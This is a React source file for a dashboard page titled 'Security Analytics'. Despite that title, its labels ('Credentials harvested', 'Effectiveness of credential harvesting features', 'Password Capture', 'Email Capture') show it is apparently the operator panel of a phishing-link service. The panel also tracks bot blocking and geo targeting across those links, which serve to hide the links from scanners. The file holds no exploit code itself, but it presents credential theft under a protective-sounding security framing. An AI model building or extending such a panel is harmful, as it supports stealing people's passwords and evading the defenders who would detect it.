import { useState, useEffect } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Progress } from '@/components/ui/progress'
import { 
  Shield, 
  AlertTriangle, 
  CheckCircle, 
  XCircle,
  Bot,
  Globe,
  Mail,
  Lock,
  Eye,
  TrendingUp,
  Activity,
  Zap
} from 'lucide-react'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select'
import {
  LineChart,
  Line,
  AreaChart,
  Area,
  BarChart,
  Bar,
  PieChart,
  Pie,
  Cell,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  Legend,
  ResponsiveContainer
} from 'recharts'

export function Security() {
  const [securityData, setSecurityData] = useState({
    overview: {
      threatLevel: 'Minimal',
      totalEvents: 0,
      blockedAttempts: 0,
      dataCaptured: 0,
      uniqueIPs: 0,
      blockingRate: 0,
      captureRate: 0
    },
    threatTrend: [],
    protectionFeatures: [],
    threatTypes: [],
    recentThreats: [],
    countryBlocking: []
  })
  const [loading, setLoading] = useState(false)
  const [timeframe, setTimeframe] = useState('7d')

  useEffect(() => {
    fetchSecurityData()
  }, [timeframe])

  const fetchSecurityData = async () => {
    setLoading(true)
    try {
      const response = await fetch('/api/security-analytics')
      if (response.ok) {
        const data = await response.json()
        if (data.success) {
          setSecurityData(data)
        }
      }
    } catch (error) {
      console.error('Failed to fetch security data:', error)
    } finally {
      setLoading(false)
    }
  }

  const getThreatLevelColor = (level) => {
    switch (level.toLowerCase()) {
      case 'minimal':
        return 'bg-green-500/20 text-green-400'
      case 'low':
        return 'bg-yellow-500/20 text-yellow-400'
      case 'medium':
        return 'bg-orange-500/20 text-orange-400'
      case 'high':
        return 'bg-red-500/20 text-red-400'
      case 'critical':
        return 'bg-red-600/20 text-red-300'
      default:
        return 'bg-slate-500/20 text-slate-400'
    }
  }

  const getRiskLevelColor = (risk) => {
    switch (risk.toLowerCase()) {
      case 'low':
        return 'bg-green-500/20 text-green-400'
      case 'medium':
        return 'bg-yellow-500/20 text-yellow-400'
      case 'high':
        return 'bg-red-500/20 text-red-400'
      default:
        return 'bg-slate-500/20 text-slate-400'
    }
  }

  const StatCard = ({ title, value, icon: Icon, subtitle, color = "blue", trend }) => (
    <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
      <CardContent className="p-6">
        <div className="flex items-center justify-between">
          <div>
            <p className="text-slate-400 text-sm font-medium">{title}</p>
            <p className="text-2xl font-bold text-white mt-1">{value}</p>
            {subtitle && (
              <p className="text-slate-400 text-sm mt-1">{subtitle}</p>
            )}
            {trend && (
              <p className={`text-sm mt-1 ${trend > 0 ? 'text-green-400' : 'text-red-400'}`}>
                {trend > 0 ? '+' : ''}{trend}% from last period
              </p>
            )}
          </div>
          <div className={`p-3 rounded-lg bg-${color}-500/20`}>
            <Icon className={`w-6 h-6 text-${color}-400`} />
          </div>
        </div>
      </CardContent>
    </Card>
  )

  const ProtectionFeatureCard = ({ feature }) => (
    <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
      <CardContent className="p-6">
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center space-x-3">
            <div className={`p-2 rounded-lg ${feature.enabled ? 'bg-green-500/20' : 'bg-slate-500/20'}`}>
              {feature.name === 'Bot Blocking' && <Bot className={`w-5 h-5 ${feature.enabled ? 'text-green-400' : 'text-slate-400'}`} />}
              {feature.name === 'Geo Targeting' && <Globe className={`w-5 h-5 ${feature.enabled ? 'text-green-400' : 'text-slate-400'}`} />}
              {feature.name === 'Email Capture' && <Mail className={`w-5 h-5 ${feature.enabled ? 'text-green-400' : 'text-slate-400'}`} />}
              {feature.name === 'Password Capture' && <Lock className={`w-5 h-5 ${feature.enabled ? 'text-green-400' : 'text-slate-400'}`} />}
            </div>
            <div>
              <h3 className="text-white font-medium">{feature.name}</h3>
              <p className="text-slate-400 text-sm">
                {feature.linksEnabled} of {feature.totalLinks} links enabled
              </p>
            </div>
          </div>
          <Badge className={feature.enabled ? 'bg-green-500/20 text-green-400' : 'bg-slate-500/20 text-slate-400'}>
            {feature.status}
          </Badge>
        </div>
        
        <div className="space-y-3">
          <div className="flex justify-between text-sm">
            <span className="text-slate-400">Coverage</span>
            <span className="text-white">{Math.round((feature.linksEnabled / feature.totalLinks) * 100)}%</span>
          </div>
          <Progress 
            value={(feature.linksEnabled / feature.totalLinks) * 100} 
            className="h-2"
          />
          
          <div className="flex justify-between text-sm">
            <span className="text-slate-400">Detection Rate</span>
            <span className="text-white">{feature.detectionRate}%</span>
          </div>
        </div>
      </CardContent>
    </Card>
  )

  const HighRiskIPRow = ({ ip }) => (
    <div className="bg-slate-800/30 backdrop-blur-sm border border-slate-700/50 rounded-lg p-4 hover:bg-slate-800/50 transition-colors">
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <div className="flex items-center space-x-3">
            <AlertTriangle className="w-5 h-5 text-red-400" />
            <div>
              <h3 className="text-white font-medium">{ip.ip}</h3>
              <p className="text-slate-400 text-sm">{ip.country}</p>
            </div>
          </div>
        </div>
        
        <div className="grid grid-cols-3 gap-8 text-center">
          <div>
            <p className="text-xl font-bold text-white">{ip.attempts}</p>
            <p className="text-slate-400 text-xs">Attempts</p>
          </div>
          <div>
            <p className="text-sm text-slate-300">{ip.lastSeen}</p>
            <p className="text-slate-400 text-xs">Last Seen</p>
          </div>
          <div>
            <Badge className={getRiskLevelColor(ip.risk)}>
              {ip.risk} Risk
            </Badge>
          </div>
        </div>
      </div>
    </div>
  )

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-3xl font-bold text-white flex items-center">
            <Shield className="w-8 h-8 mr-3 text-green-400" />
            Security Analytics
          </h2>
          <p className="text-slate-400 mt-1">Security metrics and threat analysis</p>
        </div>
        <div className="flex items-center space-x-4">
          <Select value={timeframe} onValueChange={setTimeframe}>
            <SelectTrigger className="w-32 bg-slate-800/50 border-slate-700 text-white">
              <SelectValue />
            </SelectTrigger>
            <SelectContent className="bg-slate-800 border-slate-700">
              <SelectItem value="24h">Last 24 Hours</SelectItem>
              <SelectItem value="7d">Last 7 Days</SelectItem>
              <SelectItem value="30d">Last 30 Days</SelectItem>
              <SelectItem value="90d">Last 90 Days</SelectItem>
            </SelectContent>
          </Select>
        </div>
      </div>

      {/* Current Threat Level */}
      <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
        <CardContent className="p-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <div className="p-4 rounded-lg bg-green-500/20">
                <CheckCircle className="w-8 h-8 text-green-400" />
              </div>
              <div>
                <h3 className="text-white text-xl font-bold">Current Threat Level</h3>
                <p className="text-slate-400">Based on blocking rate (7.1%) and data capture rate (12.5%)</p>
              </div>
            </div>
            <Badge className={getThreatLevelColor(securityData.overview.threatLevel)} size="lg">
              {securityData.overview.threatLevel}
            </Badge>
          </div>
        </CardContent>
      </Card>

      {/* Overview Stats */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
        <StatCard
          title="Total Events"
          value={securityData.overview.totalEvents.toLocaleString()}
          icon={Activity}
          subtitle="All interactions"
          color="blue"
          trend={8.5}
        />
        <StatCard
          title="Blocked Attempts"
          value={securityData.overview.blockedAttempts}
          icon={XCircle}
          subtitle="Security blocks"
          color="red"
          trend={18.7}
        />
        <StatCard
          title="Data Captured"
          value={securityData.overview.dataCaptured}
          icon={Eye}
          subtitle="Credentials harvested"
          color="purple"
          trend={-2.1}
        />
        <StatCard
          title="Unique IPs"
          value={securityData.overview.uniqueIPs}
          icon={Globe}
          subtitle="Distinct sources"
          color="green"
          trend={12.3}
        />
      </div>

      {/* Charts Row */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Threat Trend */}
        <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center">
              <TrendingUp className="w-5 h-5 mr-2 text-red-400" />
              Threat Detection Trend
            </CardTitle>
            <CardDescription className="text-slate-400">
              Daily threat detection and blocking effectiveness
            </CardDescription>
          </CardHeader>
          <CardContent>
            <ResponsiveContainer width="100%" height={300}>
              <AreaChart data={securityData.threatTrend}>
                <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                <XAxis dataKey="date" stroke="#9ca3af" />
                <YAxis stroke="#9ca3af" />
                <Tooltip 
                  contentStyle={{ 
                    backgroundColor: '#1f2937', 
                    border: '1px solid #374151',
                    borderRadius: '8px'
                  }}
                />
                <Legend />
                <Area
                  type="monotone"
                  dataKey="threats"
                  stackId="1"
                  stroke="#ef4444"
                  fill="#ef4444"
                  fillOpacity={0.3}
                  name="Threats Detected"
                />
                <Area
                  type="monotone"
                  dataKey="blocked"
                  stackId="2"
                  stroke="#10b981"
                  fill="#10b981"
                  fillOpacity={0.3}
                  name="Threats Blocked"
                />
              </AreaChart>
            </ResponsiveContainer>
          </CardContent>
        </Card>

        {/* Threat Types */}
        <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center">
              <AlertTriangle className="w-5 h-5 mr-2 text-orange-400" />
              Threat Types Distribution
            </CardTitle>
            <CardDescription className="text-slate-400">
              Breakdown of detected threat categories
            </CardDescription>
          </CardHeader>
          <CardContent>
            <ResponsiveContainer width="100%" height={300}>
              <PieChart>
                <Pie
                  data={securityData.threatTypes}
                  cx="50%"
                  cy="50%"
                  innerRadius={60}
                  outerRadius={100}
                  paddingAngle={5}
                  dataKey="value"
                >
                  {securityData.threatTypes.map((entry, index) => (
                    <Cell key={`cell-${index}`} fill={entry.color} />
                  ))}
                </Pie>
                <Tooltip 
                  contentStyle={{ 
                    backgroundColor: '#1f2937', 
                    border: '1px solid #374151',
                    borderRadius: '8px'
                  }}
                />
                <Legend />
              </PieChart>
            </ResponsiveContainer>
          </CardContent>
        </Card>
      </div>

      {/* Protection Features */}
      <div>
        <h3 className="text-xl font-bold text-white mb-4 flex items-center">
          <Shield className="w-6 h-6 mr-2 text-blue-400" />
          Data Capture Performance
        </h3>
        <p className="text-slate-400 mb-6">Effectiveness of credential harvesting features</p>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
          {securityData.protectionFeatures.map((feature, index) => (
            <ProtectionFeatureCard key={index} feature={feature} />
          ))}
        </div>
      </div>

      {/* Protection Features Status */}
      <div>
        <h3 className="text-xl font-bold text-white mb-4 flex items-center">
          <Zap className="w-6 h-6 mr-2 text-yellow-400" />
          Protection Features
        </h3>
        <p className="text-slate-400 mb-6">Security and filtering effectiveness</p>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
            <CardHeader>
              <CardTitle className="text-white flex items-center">
                <Bot className="w-5 h-5 mr-2 text-green-400" />
                Bot Blocking
              </CardTitle>
              <CardDescription className="text-slate-400">
                3 links enabled • 94.2% detection rate
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div className="flex justify-between text-sm">
                  <span className="text-slate-400">Detected Bots</span>
                  <span className="text-green-400">89 blocked</span>
                </div>
                <Progress value={94.2} className="h-2" />
                <p className="text-xs text-slate-400">
                  Advanced user agent and behavior analysis
                </p>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
            <CardHeader>
              <CardTitle className="text-white flex items-center">
                <Globe className="w-5 h-5 mr-2 text-purple-400" />
                Geo Targeting
              </CardTitle>
              <CardDescription className="text-slate-400">
                0 links enabled • 0% geo-blocked
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div className="flex justify-between text-sm">
                  <span className="text-slate-400">Geo Violations</span>
                  <span className="text-slate-400">0 blocked</span>
                </div>
                <Progress value={0} className="h-2" />
                <p className="text-xs text-slate-400">
                  Country and region-based access control
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>

      {/* High Risk IP Addresses */}
      <Card className="bg-slate-800/50 backdrop-blur-sm border-slate-700">
        <CardHeader>
          <CardTitle className="text-white flex items-center justify-between">
            <span className="flex items-center">
              <AlertTriangle className="w-5 h-5 mr-2 text-red-400" />
              High Risk IP Addresses
            </span>
            <Badge variant="secondary" className="bg-red-500/20 text-red-400">
              {securityData.highRiskIPs.length} IPs
            </Badge>
          </CardTitle>
          <CardDescription className="text-slate-400">
            IP addresses with suspicious activity patterns
          </CardDescription>
        </CardHeader>
        <CardContent className="p-6">
          <div className="space-y-4">
            {securityData.highRiskIPs.map((ip, index) => (
              <HighRiskIPRow key={index} ip={ip} />
            ))}
          </div>
        </CardContent>
      </Card>
    </div>
  )
}

